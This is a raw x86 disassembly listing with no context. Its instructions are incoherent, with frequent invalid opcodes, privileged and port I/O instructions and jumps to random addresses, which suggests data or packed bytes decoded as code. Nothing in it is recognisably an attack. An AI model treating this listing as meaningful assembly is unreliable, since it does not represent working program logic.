  41994b:	or     ch,BYTE PTR [eax+ebx*1-0x17]
  41994f:	fist   DWORD PTR [eax+ebx*1+0x2bdae6e1]
  419956:	add    BYTE PTR [eax],al
  419958:	add    BYTE PTR [eax],al
  41995a:	add    dh,cl
  41995c:	pmaxsw mm2,QWORD PTR [edi]
  41995f:	cld    
  419960:	adc    ch,BYTE PTR [esi+ecx*1-0x37]
  419964:	div    BYTE PTR [edi+ebp*4]
  419967:	cmp    esi,esi
  419969:	(bad)  
  41996a:	hlt    
  41996b:	jb     0x41996f
  41996d:	fs inc esp
  41996f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419970:	add    al,0xc5
  419972:	inc    ebx
  419973:	retf   
  419974:	sbb    dh,BYTE PTR [ebp+0x1e1019f8]
  41997a:	sub    al,0x5
  41997c:	out    dx,eax
  41997d:	lods   eax,DWORD PTR ds:[esi]
  41997e:	pop    ss
  41997f:	stos   DWORD PTR es:[edi],eax
  419980:	scas   eax,DWORD PTR es:[edi]
  419981:	jo     0x4199c6
  419983:	pushf  
  419984:	inc    esp
  419985:	out    dx,eax
  419986:	add    edi,eax
  419988:	xchg   esi,eax
  419989:	retf   0xf1ff
  41998c:	cmc    
  41998d:	repnz out dx,eax
  41998f:	stos   BYTE PTR es:[edi],al
  419990:	add    dl,BYTE PTR [edi]
  419992:	sub    al,0xc
  419994:	adc    BYTE PTR [esi+0x17],bh
  419997:	icebp  
  419998:	inc    edx
  419999:	add    ah,bh
  41999b:	js     0x4199aa
  41999d:	je     0x419964
  41999f:	retf   0x130e
  4199a2:	or     ebp,eax
  4199a4:	iret   
  4199a5:	jmp    DWORD PTR [ebx+0x31]
  4199a8:	xchg   esi,eax
  4199a9:	add    BYTE PTR [edx],bl
  4199ab:	cmp    edx,eax
  4199ad:	shl    ebp,0x76
  4199b0:	mov    bl,0x88
  4199b2:	push   ebp
  4199b3:	neg    BYTE PTR [esi]
  4199b5:	sub    al,0x9a
  4199b7:	enter  0xd8d2,0x9e
  4199bb:	std    
  4199bc:	xchg   ebx,eax
  4199bd:	jecxz  0x419a30
  4199bf:	add    BYTE PTR [eax],al
  4199c1:	add    BYTE PTR [eax],al
  4199c3:	add    BYTE PTR [ebx],bl
  4199c5:	add    al,BYTE PTR [eax]
  4199c7:	jmp    0x123e45ba
  4199cc:	sub    ecx,DWORD PTR [esi]
  4199ce:	add    cl,ch
  4199d0:	retf   
  4199d1:	add    al,BYTE PTR [eax]
  4199d3:	jmp    0x7292503e
  4199d8:	mov    ds:0x3ad4fcb2,eax
  4199dd:	repz aas 
  4199df:	jmp    0xb3395ce5
  4199e4:	mov    bh,0x93
  4199e6:	adc    al,0x3a
  4199e8:	adc    dh,BYTE PTR [edx+0xe06a788]
  4199ee:	adc    esi,ecx
  4199f0:	and    cl,bh
  4199f2:	call   FWORD PTR [edi+0x35]
  4199f5:	pop    ss
  4199f6:	cmp    DWORD PTR [edx-0x165a7985],ebp
  4199fc:	jbe    0x419a00
  4199fe:	std    
  4199ff:	fsub   QWORD PTR [edx]
  419a01:	repz aas 
  419a03:	jmp    0x71392d6b
  419a08:	xor    eax,0x621fe813
  419a0d:	or     eax,0xfd366dfd
  419a12:	and    DWORD PTR [esi+esi*2+0x2],0x0
  419a17:	add    BYTE PTR [edi+0x42],ah
  419a1a:	add    eax,0x36fe9189
  419a1f:	ret    
  419a20:	rcl    DWORD PTR [eax],1
  419a22:	mov    al,BYTE PTR [ebp-0x20]
  419a25:	jge    0x419a68
  419a27:	or     BYTE PTR [eax],al
  419a29:	add    BYTE PTR [eax],al
  419a2b:	add    BYTE PTR [eax],al
  419a2d:	inc    edi
  419a2e:	repz mov bh,0x97
  419a31:	int3   
  419a32:	add    al,BYTE PTR [eax]
  419a34:	call   0x419128
  419a39:	jecxz  0x419a8e
  419a3b:	push   eax
  419a3c:	jmp    ecx
  419a3e:	cli    
  419a3f:	cli    
  419a40:	adc    eax,0x3d145c
  419a45:	pop    ss
  419a46:	repz repz rcr DWORD PTR ss:[esi],0x50
  419a4c:	push   edi
  419a4d:	mov    edi,0xe1ff5053
  419a52:	cli    
  419a53:	cli    
  419a54:	adc    eax,0x3d1ddc
  419a59:	xlat   BYTE PTR ds:[ebx]
  419a5a:	icebp  
  419a5b:	ss repz loopne 0x419a9e
  419a5f:	cld    
  419a60:	adc    eax,0x3d174c
  419a65:	in     al,dx
  419a66:	hlt    
  419a67:	adc    ah,dl
  419a69:	das    
  419a6a:	inc    edx
  419a6b:	std    
  419a6c:	push   ebp
  419a6d:	jl     0x419a4d
  419a6f:	(bad)  
  419a70:	(bad)  
  419a71:	sbb    edi,eax
  419a73:	add    eax,0xffffffd1
  419a76:	add    al,0x56
  419a78:	jmp    DWORD PTR [ecx]
  419a7a:	mov    ss,WORD PTR [ebx]
  419a7c:	inc    eax
  419a7d:	or     al,0x7a
  419a7f:	pop    ecx
  419a80:	call   DWORD PTR [ecx-0x1dfb8c3a]
  419a86:	dec    ebp
  419a87:	cld    
  419a88:	add    DWORD PTR [edx-0x9],esp
  419a8b:	adc    BYTE PTR [eax],dl
  419a8d:	add    BYTE PTR [edx-0x3],al
  419a90:	aaa    
  419a91:	add    BYTE PTR [eax],al
  419a93:	add    BYTE PTR [eax],al
  419a95:	add    BYTE PTR [ecx],bh
  419a97:	div    DWORD PTR [eax+0xd]
  419a9a:	jne    0x419ace
  419a9c:	mov    dh,0xf3
  419a9e:	popa   
  419a9f:	and    edx,DWORD PTR [ebx+esi*2]
  419aa2:	jmp    0xdb3fac1a
  419aa7:	mov    WORD PTR [edx],ss
  419aa9:	jae    0x419a78
  419aab:	xchg   esp,eax
  419aac:	in     al,dx
  419aad:	sbb    esp,DWORD PTR [ecx-0x25]
  419ab0:	add    ecx,DWORD PTR [edx+0x5db2a438]
  419ab6:	push   ds
  419ab7:	rol    BYTE PTR [ecx+0x4],cl
  419aba:	jne    0x419b0a
  419abc:	mov    ah,ch
  419abe:	inc    esp
  419abf:	dec    eax
  419ac0:	stos   DWORD PTR es:[edi],eax
  419ac1:	mov    dh,BYTE PTR [eax]
  419ac3:	(bad)  
  419ac4:	mov    al,0x69
  419ac6:	je     0x419af9
  419ac8:	add    ebp,edi
  419aca:	or     BYTE PTR [ebx],ah
  419acc:	mov    al,BYTE PTR [ebx-0x77]
  419acf:	imul   edx,DWORD PTR [ebx+edx*1],0x59
  419ad3:	or     eax,ecx
  419ad5:	push   ecx
  419ad7:	fisttp DWORD PTR [esi+edx*1-0xdc23]
  419ade:	jne    0x419b34
  419ae0:	xchg   BYTE PTR [ebx+0x6d],al
  419ae3:	imul   edx,DWORD PTR [ebx+esi*2],0x69
  419ae7:	sahf   
  419ae8:	mov    ebx,?
  419aea:	pop    ebp
  419aeb:	repz add eax,DWORD PTR [eax]
  419aee:	jne    0x419a90
  419af0:	cmp    ebp,ecx
  419af2:	jbe    0x419a8c
  419af4:	inc    edi
  419af5:	std    
  419af6:	neg    BYTE PTR [edi]
  419af8:	adc    al,0x74
  419afa:	add    BYTE PTR [eax],al
  419afc:	add    BYTE PTR [eax],al
  419afe:	add    BYTE PTR [ebp-0x5e00bfd3],ah
  419b04:	sar    BYTE PTR [esi+0x7b],0x6d
  419b08:	sbb    cl,BYTE PTR [ebp+0xbcdf605]
  419b0e:	add    cl,BYTE PTR [eax-0x7f26830c]
  419b14:	and    al,0xd0
  419b16:	mov    edi,0xfc70029b
  419b1b:	or     eax,0xfe28b7b2
  419b20:	rcl    BYTE PTR [ebp+0x25cdf59d],0x4
  419b27:	add    WORD PTR [edx],si
  419b2a:	sub    DWORD PTR [ebp-0x2c00443e],eax
  419b30:	or     al,0xe7
  419b32:	nop
  419b33:	(bad)  
  419b34:	rcr    DWORD PTR [edi-0x52020463],1
  419b3a:	mov    BYTE PTR [ebp+0x2b015f80],bl
  419b40:	fisubr WORD PTR [ecx-0x6a]
  419b43:	jb     0x419b45
  419b45:	aam    0xdd
  419b47:	dec    ecx
  419b48:	sbb    ah,BYTE PTR ds:0x720c99dd
  419b4e:	adc    esi,esi
  419b50:	adc    edi,DWORD PTR [ebx-0x17f9ed0e]
  419b56:	add    esi,DWORD PTR [ebp-0x4b]
  419b59:	mov    esp,0xf7ca6614
  419b5e:	ret    
  419b5f:	jb     0x419ae8
  419b61:	daa    
  419b62:	mov    es,WORD PTR [eax]
  419b64:	add    BYTE PTR [eax],al
  419b66:	add    BYTE PTR [eax],al
  419b68:	jne    0x419be9
  419b6a:	and    dl,BYTE PTR [ebx+ecx*8]
  419b6d:	sbb    ah,cl
  419b6f:	clc    
  419b70:	pop    ecx
  419b71:	or     al,0x72
  419b73:	inc    eax
  419b74:	pop    esp
  419b75:	add    BYTE PTR [edx+0x4b],ch
  419b78:	dec    eax
  419b79:	lods   eax,DWORD PTR ds:[esi]
  419b7a:	xchg   ecx,eax
  419b7b:	dec    edx
  419b7c:	aaa    
  419b7d:	sti    
  419b7e:	out    0xb8,al
  419b80:	in     eax,dx
  419b81:	push   ds
  419b82:	cmp    BYTE PTR [ebp+0x4d2a5f5],dh
  419b88:	(bad)  
  419b89:	mov    ebp,0x18cb5ce
  419b8e:	push   ecx
  419b8f:	add    al,0x18
  419b91:	xchg   esi,eax
  419b92:	out    dx,al
  419b93:	jl     0x419b4b
  419b95:	or     al,BYTE PTR [eax]
  419b97:	sbb    DWORD PTR [esi-0x11],esp
  419b9a:	and    ebx,ecx
  419b9c:	ss or  al,0x84
  419b9f:	test   eax,0x1355f4dc
  419ba4:	jge    0x419c1d
  419ba6:	inc    ebx
  419ba7:	xchg   ebp,eax
  419ba8:	and    DWORD PTR [ecx+0x43],edi
  419bab:	loope  0x419bd3
  419bad:	psllq  mm5,0xf5
  419bb1:	(bad)  
  419bb2:	not    DWORD PTR [ecx-0x1602f41e]
  419bb8:	add    al,0x1b
  419bba:	add    DWORD PTR [edx-0x7f],ebp
  419bbd:	or     eax,0x8f6d6181
  419bc2:	add    ah,BYTE PTR [eax]
  419bc4:	mov    esp,0xf3ed7403
  419bc9:	lahf   
  419bca:	sti    
  419bcb:	jmp    0x419bd0
  419bd0:	add    BYTE PTR [ebx],ah
  419bd2:	mov    edi,0xfa3330fb
  419bd7:	call   DWORD PTR [ebx+0x64551e13]
  419bdd:	mov    esp,0xdc2e4fef
  419be2:	sti    
  419be3:	xor    BYTE PTR [esi],0x66
  419be6:	or     eax,0xb10ed73
  419beb:	(bad)  
  419bec:	pushf  
  419bed:	outs   dx,BYTE PTR ds:[esi]
  419bee:	push   cs
  419bef:	ss push cs
  419bf1:	pop    esp
  419bf2:	jmp    0x419c03
  419bf4:	test   eax,0x64360d76
  419bf9:	mov    ecx,0x427443fd
  419bfe:	push   cs
  419bff:	adc    eax,ecx
  419c01:	inc    esi
  419c02:	retf   
  419c03:	push   DWORD PTR [ecx-0x51]
  419c06:	lods   eax,DWORD PTR ds:[esi]
  419c07:	pop    edx
  419c08:	stos   DWORD PTR es:[edi],eax
  419c09:	or     edx,DWORD PTR es:[edx+eiz*2-0x76]
  419c0e:	mov    ebx,0xb1521a50
  419c13:	mov    al,BYTE PTR [eax]
  419c15:	popa   
  419c16:	repnz dec esp
  419c18:	push   ebx
  419c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c1a:	add    al,0x4f
  419c1c:	push   ebx
  419c1d:	outs   dx,DWORD PTR ds:[esi]
  419c1e:	out    dx,eax
  419c1f:	jo     0x419c29
  419c21:	test   BYTE PTR [esi],al
  419c23:	add    BYTE PTR [eax],al
  419c25:	mov    WORD PTR [edi-0x7a],cs
  419c28:	inc    ebp
  419c29:	adc    al,dh
  419c2b:	adc    BYTE PTR [esp+ebp*8],bl
  419c2e:	ds std 
  419c30:	test   BYTE PTR [edx+ebp*2],cl
  419c33:	and    bh,bh
  419c35:	add    BYTE PTR [eax],al
  419c37:	add    BYTE PTR [eax],al
  419c39:	add    cl,bl
  419c3b:	push   ss
  419c3c:	cld    
  419c3d:	jne    0x419be7
  419c3f:	out    dx,eax
  419c40:	jo     0x419c52
  419c42:	outs   dx,DWORD PTR ds:[esi]
  419c43:	out    dx,eax
  419c44:	jo     0x419c52
  419c46:	push   ebx
  419c47:	push   0xfffffff9
  419c49:	(bad)  
  419c4a:	mov    ecx,0x9c400d2a
  419c4f:	jns    0x419c11
  419c51:	jne    0x419bf1
  419c53:	mov    bl,0xfc
  419c55:	dec    cl
  419c57:	cli    
  419c58:	cli    
  419c59:	adc    eax,0x3d1684
  419c5e:	push   es
  419c5f:	les    edx,FWORD PTR [esi-0x37]
  419c62:	pop    esi
  419c63:	adc    edi,ebp
  419c65:	push   esp
  419c66:	pop    ss
  419c67:	jmp    0x419ce7
  419c69:	in     al,dx
  419c6a:	add    BYTE PTR [ebx+0x5093f849],0x53
  419c71:	mov    ecx,DWORD PTR [ecx+0x26]
  419c74:	or     eax,0x41834c40
  419c79:	cld    
  419c7a:	cld    
  419c7b:	xor    al,bl
  419c7d:	push   ebx
  419c7e:	push   ebx
  419c7f:	jb     0x419c8a
  419c81:	mov    ecx,esp
  419c83:	stc    
  419c84:	dec    esi
  419c85:	dec    ecx
  419c87:	or     eax,0xcd5337fc
  419c8c:	add    al,0xc9
  419c8f:	inc    edi
  419c90:	mov    BYTE PTR [ebp+0x75],al
  419c93:	das    
  419c94:	retf   
  419c95:	shr    BYTE PTR [eax+0x1d5b7a1e],0x35
  419c9c:	iret   
  419c9d:	add    BYTE PTR [eax],0x0
  419ca0:	add    BYTE PTR [eax],al
  419ca2:	add    BYTE PTR ds:0x81c0cc20,dh
  419ca8:	adc    ebx,DWORD PTR [ecx]
  419caa:	mov    ebx,0x870f585c
  419caf:	mov    al,0x67
  419cb1:	retf   
  419cb2:	shr    BYTE PTR [ecx+0x37],0x7e
  419cb6:	dec    ebx
  419cb7:	jmp    0x693e5086
  419cbc:	daa    
  419cbd:	mov    ah,0xfc
  419cbf:	pusha  
  419cc0:	adc    edx,DWORD PTR [eax]
  419cc2:	xor    eax,0xc08571d2
  419cc7:	inc    eax
  419cc8:	sub    edi,DWORD PTR [ebx+eax*2+0x65]
  419ccc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ccd:	mov    esp,0x7c13ecf3
  419cd2:	inc    ebx
  419cd3:	mov    cl,0x92
  419cd5:	(bad)  
  419cd6:	neg    DWORD PTR [esi-0x568cefdd]
  419cdc:	ret    
  419cdd:	dec    esp
  419cde:	pop    ss
  419cdf:	call   0xd92e:0x92350ec0
  419ce6:	sysexit 
  419ce8:	sbb    edi,DWORD PTR [ebx+eax*2+0x7d]
  419cec:	jns    0x419c9a
  419cee:	(bad)  
  419cef:	mov    bh,0xf
  419cf1:	add    DWORD PTR [ecx-0x5a],edx
  419cf4:	(bad)  [ebx+0x104bc54f]
  419cfa:	je     0x419c95
  419cfc:	adc    edx,DWORD PTR [eax]
  419cfe:	ss pop edx
  419d00:	es loope 0x419d12
  419d03:	mov    ch,0x1b
  419d05:	adc    BYTE PTR [esi],dh
  419d07:	add    BYTE PTR [eax],al
  419d09:	add    BYTE PTR [eax],al
  419d0b:	add    dh,bh
  419d0d:	repnz push ss
  419d0f:	fstp   DWORD PTR [edi-0xc]
  419d12:	adc    ecx,eax
  419d14:	cmp    al,BYTE PTR [edx]
  419d16:	cld    
  419d17:	fild   DWORD PTR [edx+0x347de6c2]
  419d1d:	lods   eax,DWORD PTR ds:[esi]
  419d1e:	test   al,0x7
  419d20:	jne    0x419cd3
  419d22:	popa   
  419d23:	or     ebp,DWORD PTR [edx+0x1252ceb1]
  419d29:	or     edi,esp
  419d2b:	xchg   BYTE PTR ds:0x2787378a,dh
  419d31:	(bad)  
  419d32:	jecxz  0x419d81
  419d34:	aad    0x94
  419d36:	es add al,0xa4
  419d39:	inc    edx
  419d3a:	cmp    al,BYTE PTR [edi-0x3403714e]
  419d40:	je     0x419cd0
  419d42:	cmp    BYTE PTR [edi+0x4bed8ed8],al
  419d48:	sub    BYTE PTR [edx],al
  419d4a:	out    0x83,al
  419d4c:	fdiv   QWORD PTR [edx-0x3d72d2]
  419d52:	data16 sbb al,0x35
  419d55:	mov    al,0x65
  419d57:	xchg   edi,eax
  419d58:	push   esi
  419d59:	out    dx,al
  419d5a:	imul   edx,DWORD PTR [edx-0x47434c57],0x65
  419d61:	sub    eax,0xf03ef64e
  419d66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d67:	add    esi,esp
  419d69:	cmp    eax,0x20f4ad7
  419d6e:	out    dx,al
  419d6f:	add    DWORD PTR [eax],0x0
  419d72:	add    BYTE PTR [eax],al
  419d74:	add    dh,dh
  419d76:	inc    ecx
  419d77:	scas   eax,DWORD PTR es:[edi]
  419d78:	add    BYTE PTR [eax+eax*2],bh
  419d7b:	sahf   
  419d7c:	cld    
  419d7d:	out    0xfd,eax
  419d7f:	outs   dx,BYTE PTR ds:[esi]
  419d80:	out    dx,eax
  419d81:	test   al,0x1b
  419d83:	loopne 0x419e01
  419d85:	gs sbb al,0xe4
  419d88:	jnp    0x419e03
  419d8a:	enter  0x2a71,0x74
  419d8e:	or     BYTE PTR [edx+0x44],dh
  419d91:	stos   DWORD PTR es:[edi],eax
  419d92:	jge    0x419d94
  419d94:	adc    ch,bh
  419d96:	add    edi,DWORD PTR [ecx]
  419d98:	adc    bl,ah
  419d9a:	stc    
  419d9b:	mov    BYTE PTR ds:0xb082fc1d,dh
  419da1:	or     eax,0xce108702
  419da6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419da7:	shl    ecx,0x76
  419daa:	mov    cl,0x54
  419dac:	jb     0x419d2f
  419dae:	mov    bh,0x54
  419db0:	rcl    DWORD PTR [ecx+ecx*1],1
  419db3:	std    
  419db4:	jmp    0xaa7ac8e0
  419db9:	in     eax,0x9c
  419dbb:	cmp    BYTE PTR [edx+0x45ba050c],bh
  419dc1:	push   es
  419dc2:	enter  0xd9ff,0x36
  419dc6:	leave  
  419dc7:	enter  0xe214,0x9d
  419dcb:	ss jecxz 0x419db8
  419dce:	mov    dh,0x38
  419dd0:	sub    ah,0xfe
  419dd3:	mov    bh,0x1e
  419dd5:	jns    0x419dd4
  419dd7:	jg     0x419d5b
  419dd9:	add    BYTE PTR [eax],al
  419ddb:	add    BYTE PTR [eax],al
  419ddd:	add    bl,bh
  419ddf:	dec    edi
  419de0:	jp     0x419dcb
  419de2:	jnp    0x419d66
  419de4:	jmp    0x74488105
  419de9:	or     eax,0x4e6f7c9d
  419dee:	out    0xad,eax
  419df0:	push   esp
  419df1:	inc    esi
  419df2:	mov    WORD PTR [edi-0x7e8956eb],gs
  419df8:	(bad)  
  419df9:	fnstenv [ecx]
  419dfb:	mov    edi,?
  419dfd:	in     eax,0xf6
  419dff:	add    eax,0xffffffa1
  419e02:	ins    BYTE PTR es:[edi],dx
  419e03:	retf   0x96c5
  419e06:	jo     0x419d96
  419e08:	add    eax,0x8198962
  419e0d:	bound  ecx,QWORD PTR [eax+0x200bfd1]
  419e13:	xchg   BYTE PTR [ebx],al
  419e15:	ja     0x419df0
  419e17:	xor    dh,BYTE PTR [ebx+ecx*4-0x71]
  419e1b:	pop    eax
  419e1c:	sbb    bl,0xc5
  419e1f:	push   DWORD PTR [esi]
  419e21:	(bad)  
  419e23:	or     al,0x88
  419e25:	dec    esp
  419e26:	jo     0x419e2a
  419e28:	or     ecx,0x398504c0
  419e2e:	dec    ebx
  419e2f:	pop    ebx
  419e30:	mov    edi,0xc57a1c08
  419e35:	je     0x419e45
  419e37:	mov    ebx,0x77cbfffa
  419e3c:	push   esp
  419e3d:	mov    ebx,esp
  419e3f:	xor    edi,esp
  419e41:	add    BYTE PTR [eax],0x0
  419e44:	add    BYTE PTR [eax],al
  419e46:	add    ch,dl
  419e48:	add    dh,BYTE PTR [esp+eax*1-0x63]
  419e4c:	dec    esp
  419e4d:	jb     0x419e46
  419e4f:	push   ecx
  419e50:	shl    DWORD PTR [eax+0x5],1
  419e53:	sub    edx,DWORD PTR [eax-0x3]
  419e56:	push   es
  419e57:	pop    esp
  419e58:	jp     0x419e50
  419e5a:	je     0x419e35
  419e5c:	jns    0x419e59
  419e5e:	js     0x419e32
  419e60:	sub    edi,DWORD PTR [edi-0x1142d77]
  419e66:	add    BYTE PTR [edx-0x14387902],0xeb
  419e6d:	add    BYTE PTR [eax-0x7ffcfd1d],bh
  419e73:	adc    ebx,eax
  419e75:	je     0x419e7e
  419e77:	and    ebp,ebp
  419e79:	jae    0x419e7e
  419e7b:	pop    ds
  419e7c:	sbb    eax,0xc611c2fd
  419e81:	jae    0x419eb7
  419e83:	add    al,0xf8
  419e85:	cli    
  419e86:	call   FWORD PTR [ebx]
  419e88:	dec    ebp
  419e89:	mov    al,dl
  419e8b:	dec    edi
  419e8c:	cmc    
  419e8d:	cmp    DWORD PTR gs:[ebp+0x32],esi
  419e91:	xchg   ebp,eax
  419e92:	add    eax,0x49fedaf6
  419e97:	enter  0x8506,0xd2
  419e9b:	rcr    BYTE PTR [esi],0x4e
  419e9e:	push   ebp
  419e9f:	jne    0x419eb5
  419ea1:	add    DWORD PTR [ebx-0x7d006fbd],0x2905a432
  419eab:	add    BYTE PTR [eax],al
  419ead:	add    BYTE PTR [eax],al
  419eaf:	add    BYTE PTR [edi],dh
  419eb1:	xchg   ebx,eax
  419eb2:	add    eax,0xe59876e9
  419eb7:	(bad)  
  419eb8:	out    dx,eax
  419eb9:	pop    esp
  419eba:	stos   DWORD PTR es:[edi],eax
  419ebb:	call   0xfff52238
  419ec0:	jae    0x419e5d
  419ec2:	test   al,al
  419ec4:	jl     0x419eda
  419ec6:	xchg   dh,dh
  419ec8:	sbb    DWORD PTR [eax],0x58752680
  419ece:	iret   
  419ecf:	mov    edi,0xd9853ae
  419ed4:	hlt    
  419ed5:	xor    cl,BYTE PTR [edi*8+0x591f4da]
  419edc:	or     eax,0xf50503e5
  419ee1:	pop    eax
  419ee2:	leave  
  419ee3:	add    DWORD PTR [eax+0x1f],ecx
  419ee6:	inc    esp
  419ee7:	add    dl,BYTE PTR [ecx]
  419ee9:	or     ecx,eax
  419eeb:	jmp    FWORD PTR [edi-0x2d]
  419eee:	xchg   edi,eax
  419eef:	add    esp,edi
  419ef1:	sbb    al,BYTE PTR [eax+0x31]
  419ef4:	mov    ch,0xf2
  419ef6:	(bad)  
  419ef7:	and    esi,DWORD PTR [ecx+0x2e]
  419efa:	add    esi,DWORD PTR [edi]
  419efc:	cmp    edi,esi
  419efe:	sti    
  419eff:	jb     0x419f80
  419f01:	call   0xfd0a:0xcc6d238f
  419f08:	cli    
  419f09:	dec    esp
  419f0a:	push   es
  419f0b:	mov    eax,0x4e702ca
  419f10:	cmc    
  419f11:	aas    
  419f12:	out    dx,eax
  419f13:	add    eax,DWORD PTR [eax]
  419f15:	add    BYTE PTR [eax],al
  419f17:	add    BYTE PTR [eax],al
  419f19:	les    ebp,FWORD PTR [ebp+edi*4+0x1979a499]
  419f20:	rcl    DWORD PTR [edx],1
  419f22:	shl    DWORD PTR [ecx],1
  419f24:	lods   eax,DWORD PTR ds:[esi]
  419f25:	popf   
  419f26:	adc    ebp,DWORD PTR [ebp+esi*2+0x31]
  419f2a:	add    eax,0x2ff78cf6
  419f2f:	jae    0x419f2e
  419f31:	cld    
  419f32:	in     eax,dx
  419f33:	hlt    
  419f34:	xchg   DWORD PTR [edi-0x72],eax
  419f37:	in     eax,0x7b
  419f39:	jb     0x419efe
  419f3b:	sub    DWORD PTR [ebp+0xc641aa7],edi
  419f41:	xchg   ch,bh
  419f43:	das    
  419f44:	mov    ecx,0x4e687c2
  419f49:	cmc    
  419f4a:	cmp    ebp,eax
  419f4c:	add    ebp,esp
  419f4e:	mov    ch,0x2
  419f50:	hlt    
  419f51:	idiv   DWORD PTR [edx]
  419f53:	sbb    eax,DWORD PTR [edx]
  419f55:	repnz jmp 0x3eb:0x403dae3d
  419f5d:	inc    esi
  419f5e:	jns    0x419fdb
  419f60:	mov    dl,0xf5
  419f62:	sahf   
  419f63:	add    BYTE PTR [ebx],0x24
  419f66:	lods   al,BYTE PTR ds:[esi]
  419f67:	jno    0x419f7a
  419f69:	test   BYTE PTR [ecx],ch
  419f6b:	ins    BYTE PTR es:[edi],dx
  419f6c:	adc    eax,0x7915e141
  419f71:	not    BYTE PTR cs:[ecx]
  419f74:	or     esi,esi
  419f76:	inc    ecx
  419f77:	shl    edi,cl
  419f79:	jno    0x419fc8
  419f7b:	sti    
  419f7c:	cld    
  419f7d:	add    BYTE PTR [eax],al
  419f7f:	add    BYTE PTR [eax],al
  419f81:	add    BYTE PTR [eax],dl
  419f83:	jg     0x419fbe
  419f85:	xchg   edi,eax
  419f86:	jge    0x419f24
  419f88:	outs   dx,DWORD PTR ds:[esi]
  419f89:	repnz cmc 
  419f8b:	inc    edx
  419f8c:	jmp    0xfff5d54c
  419f91:	mov    ebx,0x3782a75e
  419f96:	or     edi,ebx
  419f98:	adc    BYTE PTR [eax],0x74
  419f9b:	mov    ecx,0x8872a4c4
  419fa0:	(bad)  
  419fa1:	in     eax,dx
  419fa2:	not    cl
  419fa4:	mov    edi,0x8a03cf87
  419fa9:	lods   al,BYTE PTR ds:[esi]
  419faa:	dec    esi
  419fab:	add    eax,0x187b7475
  419fb1:	bound  esi,QWORD PTR [ebx]
  419fb3:	or     BYTE PTR [esi-0x6e],bl
  419fb6:	outs   dx,DWORD PTR ds:[esi]
  419fb7:	inc    eax
  419fb8:	or     cl,ch
  419fba:	in     eax,0x7a
  419fbc:	in     al,dx
  419fbd:	cmp    ah,dh
  419fbf:	cmp    esi,DWORD PTR [ebx-0x13]
  419fc2:	inc    ebx
  419fc3:	inc    esp
  419fc4:	(bad)  
  419fc5:	stos   BYTE PTR es:[edi],al
  419fc6:	(bad)  
  419fc7:	js     0x41a03c
  419fc9:	lds    ebp,FWORD PTR [ecx+0x40]
  419fcc:	(bad)  
  419fcd:	mov    esi,0xa982a46e
  419fd2:	in     eax,0x0
  419fd4:	and    DWORD PTR [ecx+0x72c13b7e],0xaac707b4
  419fde:	and    al,0x7b
  419fe0:	in     al,dx
  419fe1:	cmp    ah,dh
  419fe3:	cmp    esi,DWORD PTR [ebx-0x1b]
  419fe6:	add    BYTE PTR [eax],al
  419fe8:	add    BYTE PTR [eax],al
  419fea:	add    BYTE PTR [ebx+0x7aac743],ch
  419ff0:	jns    0x41a065
  419ff2:	jge    0x41a055
  419ff4:	lods   eax,DWORD PTR ds:[esi]
  419ff5:	std    
  419ff6:	jbe    0x41a066
  419ff8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ff9:	sub    BYTE PTR [ecx+0x31810105],0x7e
  41a000:	cmp    eax,ecx
  41a002:	jb     0x419fb8
  41a004:	pop    es
  41a005:	(bad)  
  41a006:	sub    ah,ah
  41a008:	jp     0x419ff6
  41a00a:	dec    esi
  41a00b:	in     al,0xfb
  41a00d:	dec    esi
  41a00e:	add    BYTE PTR [ebp*8-0x7ebc0003],ah
  41a015:	sar    BYTE PTR [eax+0x7a],0x82
  41a019:	shl    BYTE PTR [ebp+0x59],cl
  41a01c:	mov    ch,0xa3
  41a01e:	jae    0x41a03c
  41a020:	jmp    FWORD PTR [esi]
  41a022:	rcl    BYTE PTR [ebp+0x42],0x5
  41a026:	jne    0x41a080
  41a028:	popa   
  41a029:	ss add ch,al
  41a02c:	sbb    eax,0xc657d9f4
  41a031:	jle    0x41a014
  41a033:	das    
  41a034:	mov    bh,BYTE PTR [edi+edx*2+0x4c]
  41a038:	add    BYTE PTR [eax-0x77b2b115],al
  41a03e:	push   ebp
  41a03f:	and    al,0x8a
  41a041:	inc    eax
  41a042:	or     BYTE PTR [esi+esi*4-0x3],bl
  41a046:	inc    DWORD PTR [ebx+0x78]
  41a049:	in     eax,0x1b
  41a04b:	inc    ebx
  41a04c:	clc    
  41a04d:	cli    
  41a04e:	pop    ebp
  41a04f:	add    BYTE PTR [eax],al
  41a051:	add    BYTE PTR [eax],al
  41a053:	add    dh,bl
  41a055:	add    bh,ch
  41a057:	push   esp
  41a058:	xchg   ebx,ebp
  41a05a:	dec    esp
  41a05b:	push   esi
  41a05c:	xchg   ebp,eax
  41a05d:	inc    edx
  41a05e:	stc    
  41a05f:	mov    ebx,DWORD PTR [ecx+0xd8b5406]
  41a065:	push   ecx
  41a066:	xchg   BYTE PTR [ebp-0x1c],al
  41a069:	out    0x9b,al
  41a06b:	inc    BYTE PTR [ebx]
  41a06d:	clc    
  41a06e:	add    al,0x64
  41a071:	dec    ecx
  41a072:	mov    cl,BYTE PTR [ebp-0x10]
  41a075:	mov    DWORD PTR [eax+0x8],edx
  41a078:	in     al,0x66
  41a07a:	sti    
  41a07b:	inc    DWORD PTR [ebx-0x7e]
  41a07e:	sar    BYTE PTR [eax-0x17],0x81
  41a082:	sti    
  41a083:	jne    0x41a0f5
  41a085:	xor    eax,0x31c8fc7a
  41a08a:	mov    BYTE PTR [ebp+0x75],cl
  41a08d:	and    DWORD PTR [edi-0x27d2b3ca],ebx
  41a093:	hlt    
  41a094:	stos   DWORD PTR es:[edi],eax
  41a095:	pop    ds
  41a096:	jno    0x86b89837
  41a09c:	and    bl,BYTE PTR [ecx]
  41a09e:	add    al,BYTE PTR [eax+0x7309d25e]
  41a0a4:	jge    0x41a11c
  41a0a6:	rol    BYTE PTR [edi],0xc5
  41a0a9:	je     0x41a06b
  41a0ab:	sti    
  41a0ac:	out    dx,al
  41a0ad:	inc    eax
  41a0ae:	jle    0x41a07e
  41a0b0:	pop    ebp
  41a0b1:	push   esi
  41a0b2:	pop    es
  41a0b3:	std    
  41a0b4:	dec    edx
  41a0b5:	adc    eax,0x82fc
  41a0ba:	add    BYTE PTR [eax],al
